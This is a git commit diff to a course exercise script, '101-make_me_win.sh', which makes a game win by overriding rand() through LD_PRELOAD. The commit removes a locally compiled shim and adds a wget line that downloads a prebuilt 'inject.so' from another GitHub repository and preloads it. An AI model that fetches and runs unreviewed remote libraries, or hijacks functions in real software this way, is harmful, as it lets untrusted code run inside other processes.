f7ff11b758221cfeed8437084e3abd57dfcb89a2
Shimaa Salah <114901288+Shima2Salah@users.noreply.github.com>
2023-11-13 23:07:41 +0200

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,5 +1,3 @@
 #!/bin/bash
-echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <time.h>\n\nvoid srand(unsigned int seed) {}\nint rand(void) { return 6; }\n' > /tmp/hack.c
-gcc -shared -fPIC -o /tmp/hack.so /tmp/hack.c
-export LD_PRELOAD=/tmp/hack.so
-
+wget https://github.com/Daransoto/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so -P ../
+export LD_PRELOAD=$PWD/../inject.so
